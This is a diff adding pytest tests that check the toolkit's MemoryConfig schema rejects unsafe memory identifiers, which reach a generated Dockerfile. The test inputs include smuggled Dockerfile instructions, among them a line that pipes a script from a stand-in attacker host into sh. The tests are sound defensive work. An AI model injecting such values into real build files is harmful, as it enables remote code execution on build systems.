@@ -8,11 +8,52 @@ from bedrock_agentcore_starter_toolkit.utils.runtime.schema import (
     BedrockAgentCoreAgentSchema,
     BedrockAgentCoreConfigSchema,
     BedrockAgentCoreDeploymentInfo,
+    MemoryConfig,
     NetworkConfiguration,
     NetworkModeConfig,
     ObservabilityConfig,
     ProtocolConfiguration,
 )
+
+
+class TestMemoryConfig:
+    """Test MemoryConfig schema validation."""
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            'x"\nRUN curl -fsSL https://attacker.example/payload.sh | sh\n# pwned',
+            "mem-123\nRUN echo pwned",
+            "mem-123 \\\n    RUN echo pwned",
+            'mem"123',
+            "mem 123",
+            "mem-123\r\nRUN echo pwned",
+            "mem-123\n",  # trailing newline only - would pass a `$`-anchored re.match
+            "a" * 129,
+        ],
+    )
+    def test_memory_identifiers_reject_injection(self, value):
+        """Memory identifiers reach the generated Dockerfile, so unsafe characters must be rejected."""
+        for field in ("memory_id", "memory_name"):
+            with pytest.raises(ValidationError) as exc_info:
+                MemoryConfig(mode="STM_ONLY", **{field: value})
+
+            assert f"Invalid {field}" in str(exc_info.value)
+
+    def test_memory_identifiers_accept_toolkit_generated_values(self):
+        """Values the toolkit itself generates must remain valid."""
+        config = MemoryConfig(mode="STM_ONLY", memory_id="myagent_mem-abc123", memory_name="myagent_memory")
+
+        assert config.memory_id == "myagent_mem-abc123"
+        assert config.memory_name == "myagent_memory"
+
+    @pytest.mark.parametrize("value", [None, ""])
+    def test_memory_identifiers_allow_unset(self, value):
+        """None and empty string mean 'not configured' and stay accepted."""
+        config = MemoryConfig(memory_id=value, memory_name=value)
+
+        assert config.memory_id == value
+        assert config.memory_name == value
 
 
 class TestNetworkConfiguration:
